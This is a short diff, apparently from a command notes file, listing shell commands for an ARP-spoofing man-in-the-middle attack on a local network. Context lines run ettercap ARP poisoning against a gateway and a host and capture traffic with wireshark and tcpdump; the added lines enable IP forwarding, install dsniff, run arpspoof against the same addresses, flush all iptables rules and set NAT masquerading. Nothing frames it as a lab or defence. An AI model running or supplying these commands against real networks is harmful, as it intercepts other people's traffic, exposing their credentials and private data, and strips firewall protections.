@@ -9,3 +9,9 @@ sudo ettercap -T -q -i eth0 -M arp 192.168.1.1 192.168.1.102
 sudo wireshark -i <interface>
 sudo tcpdump -i <interface> -w captured_traffic.pcap
 
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+sudo apt-get install dsniff
+sudo arpspoof -i eth0 -t <192.168.1.1> <192.168.1.102>
+sudo iptables -F
+sudo iptables -t nat -F
+sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
